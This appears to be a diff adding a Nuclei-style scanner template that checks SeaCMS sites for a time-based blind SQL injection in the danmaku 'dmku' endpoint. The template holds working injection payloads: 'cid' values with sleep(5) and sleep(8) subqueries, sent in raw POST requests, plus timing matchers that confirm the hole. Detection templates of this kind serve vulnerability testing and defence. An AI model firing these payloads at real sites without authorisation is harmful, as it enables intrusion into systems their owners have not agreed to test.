@@ -1,0 +1,35 @@
+id: poc-yaml-seacms-dmku-sqli
+info:
+  name: "SeaCMS js 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: SeaCMS
+
+http:
+  - raw:
+      - |
+        POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cid=(select(1)from(select(sleep(5)))x)&text=1&color=1
+      - |
+        POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cid=(select(1)from(select(sleep(8)))x)&text=1&color=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":0,"danmuku":"\u5b8c\u6210"'
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
